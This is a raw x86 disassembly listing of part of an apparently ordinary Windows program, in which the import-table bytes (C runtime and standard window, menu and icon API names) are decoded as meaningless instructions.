  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
